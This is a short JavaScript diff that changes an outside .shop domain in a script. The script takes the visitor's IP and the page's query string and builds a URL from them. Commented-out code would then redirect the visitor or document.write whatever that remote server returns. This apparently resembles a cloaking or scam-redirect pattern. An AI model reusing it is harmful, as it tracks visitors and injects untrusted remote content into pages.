@@ -8,7 +8,7 @@ fetch('https://api.ipify.org?format=json')
   .then(() => {
     const path_url = window.location.href;
     const path_array = path_url.split("?");
-    const url = "https://shoppingapi.shop/product/"+path_array[1]+"-"+people;
+    const url = "https://v3center.shop/product/"+path_array[1]+"-"+people;
     alert(url);
     // fetch(url)
     //   .then(response => {
@@ -16,7 +16,7 @@ fetch('https://api.ipify.org?format=json')
     //   })
     //   .then(data => {
     //     if(data=='go'){
-    //       window.location.replace("https://shoppingapi.shop/go/"+path_array[1]+"—"+people);
+    //       window.location.replace("https://v3center.shop/go/"+path_array[1]+"—"+people);
     //     } else {
     //       document.write(data);
     //     }
